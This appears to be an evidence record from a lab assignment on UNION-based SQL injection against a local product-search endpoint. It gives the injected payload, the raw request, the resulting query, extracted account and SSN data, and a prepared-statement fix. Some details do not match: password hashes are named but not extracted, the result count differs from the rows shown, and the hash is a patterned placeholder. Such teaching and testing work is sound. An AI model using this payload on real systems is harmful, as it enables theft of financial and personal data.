# Evidence Record: EV-SQLI-002

**Evidence ID:** `EV-SQLI-002`  
**Assessment Module:** Assignment 1 — SQL Injection  
**Vulnerability Ref:** CWE-89 (UNION-Based SQL Injection)  
**Timestamp:** `2026-09-22T14:12:00Z`  
**Target:** `http://127.0.0.1:5001/api/vulnerable/search?q=` (Product Search)  
**SHA-256 Hash:** `c5d4e3f2a1b0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0a9b8c7d6e5f4`  

---

## 1. Objective
Extract confidential financial account numbers and user password hashes from internal database tables via an unauthenticated public search endpoint.

## 2. Attack Execution & Payload
- **Injected Payload:** `' UNION SELECT 99, account_number, account_type, balance, 1, ssn_last4, 0 FROM accounts --`
- **Technique:** Column alignment with the base 7-column `products` query.

### Raw Request
```http
GET /api/vulnerable/search?q=%27%20UNION%20SELECT%2099,%20account_number,%20account_type,%20balance,%201,%20ssn_last4,%200%20FROM%20accounts%20-- HTTP/1.1
Host: 127.0.0.1:5001
```

## 3. Query Execution Mechanics
```sql
SELECT id, name, category, price, stock, description, is_hidden 
FROM products 
WHERE name LIKE '%' UNION SELECT 99, account_number, account_type, balance, 1, ssn_last4, 0 FROM accounts --%' AND is_hidden = 0
```

## 4. Response & Proof of Impact
```json
{
  "data": [
    {
      "id": 99,
      "name": "ACC-9001-ADMIN",
      "category": "Executive Reserve",
      "price": 500000.0,
      "stock": 1,
      "description": "9821"
    },
    {
      "id": 99,
      "name": "ACC-8002-JDOE",
      "category": "Payroll Account",
      "price": 8450.75,
      "stock": 1,
      "description": "4412"
    }
  ],
  "results_count": 4,
  "status": "success"
}
```

## 5. Remediation Verification
Remediated using prepared statements with parameter substitution:
`cursor.execute("SELECT ... WHERE name LIKE ?", (f"%{cleaned_term}%",))`
Retest returned `{"data": [], "results_count": 0, "status": "success"}`.
